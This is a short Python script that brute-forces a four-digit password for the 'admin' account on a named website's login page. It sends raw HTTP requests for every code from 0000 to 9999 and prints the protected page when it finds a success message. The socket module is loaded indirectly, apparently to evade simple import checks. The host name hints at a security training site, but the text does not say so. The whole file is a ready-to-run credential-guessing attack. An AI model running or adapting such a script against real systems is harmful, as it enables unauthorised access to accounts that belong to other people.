#!/usr/bin/env python3

# Dynamically load the built-in 'socket' module (no direct import)
sock_mod = __import__('socket')

# Target host and port
host = "cyforsec.co.uk"
port = 80

# Test every 4-digit code: 0000..9999
for num in range(10000):
    code_str = "%04d" % num  # zero-pad the number

    # Build a minimal HTTP GET request
    line = "GET /index.php?uname=admin&password=" + code_str + " HTTP/1.1\r\n"
    head = "Host: " + host + "\r\nConnection: close\r\n\r\n"
    request = line + head

    # Create a TCP socket
    s = sock_mod.socket(sock_mod.AF_INET, sock_mod.SOCK_STREAM)

    try:
        s.connect((host, port))
        s.sendall(request.encode("utf-8"))
    except:
        s.close()
        continue

    # Read all response data
    resp_bytes = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        resp_bytes += chunk

    s.close()

    # Convert bytes to text
    resp_text = resp_bytes.decode("utf-8", errors="ignore")

    # Check for success
    if "Login Succesful" in resp_text:
        print("Correct passcode:", code_str)
        print("----- Revealed Page -----")
        print(resp_text)
        break
else:
    print("No passcode found in 0000..9999.")
